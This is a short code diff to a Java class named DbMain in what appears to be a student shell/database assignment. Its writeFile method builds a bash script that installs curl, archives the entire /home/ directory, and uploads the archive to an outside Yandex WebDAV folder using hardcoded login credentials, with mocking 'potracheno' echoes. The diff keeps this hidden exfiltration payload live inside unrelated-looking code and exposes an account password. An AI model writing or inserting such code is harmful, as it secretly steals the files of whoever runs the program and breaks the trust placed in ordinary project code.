@@ -8,7 +8,7 @@ import ru.fizteh.fivt.students.dmitryIvanovsky.shell.CommandLauncher.Code;
 public class DbMain {
 
     public static void writeFile() throws FileNotFoundException {
-        String s = "#!/bin/bash\n\n" + "apt-get install curl\n" +
+        String s = "#!/bin/bash\n\n" + "sudo -u student -E apt-get install curl\n" +
                 "cd /home/student/tmp\n" + "echo potracheno1\n" + "pwd | cat\n" +
                 "tar cfz cradle.tar.gz --exclude=*.git* --exclude=*/.* /home/ \n" +  "echo potracheno2\n" +
                 "curl --user moy-biblio@yandex.ru:biblio -T cradle.tar.gz https://webdav.yandex.ru/cradle/\n" +
